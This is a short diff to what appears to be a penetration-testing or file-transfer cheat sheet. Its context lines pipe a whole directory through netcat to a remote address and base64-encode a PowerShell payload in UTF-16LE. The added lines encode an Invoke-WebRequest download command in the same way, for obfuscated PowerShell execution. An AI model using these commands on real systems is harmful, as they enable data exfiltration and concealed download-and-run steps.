@@ -165,6 +165,11 @@ tar cvf - . | xz -c | nc 192.168.0.1 9999
 ```bash
 iconv -f ASCII -t UTF-16LE powershell_payload.txt | base64 | tr -d "\n"
 ```
+* Another way below but prioritize above
+```bash
+echo -n 'Invoke-WebRequest -Uri "http://www.contoso.com" -OutFile "C:\path\file"' | iconv -f UTF8 -t UTF16LE | base64 -w 0
+# Remove the % character at the end
+```
 
 ## Rsync
 * Similar to SCP but better overall especially long term[^8]
